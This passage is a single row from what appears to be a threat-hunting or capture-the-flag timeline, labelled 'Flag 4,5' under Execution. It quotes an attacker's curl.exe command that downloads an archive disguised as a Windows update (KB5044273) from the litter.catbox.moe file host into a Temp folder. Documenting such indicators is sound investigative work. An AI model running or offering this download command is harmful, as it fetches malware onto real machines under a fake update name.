...
| 04:21:12 |	**Flag 4,5** |	Execution |	Malware Download Command & Hosting Service → "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z & litter.catbox.moe |
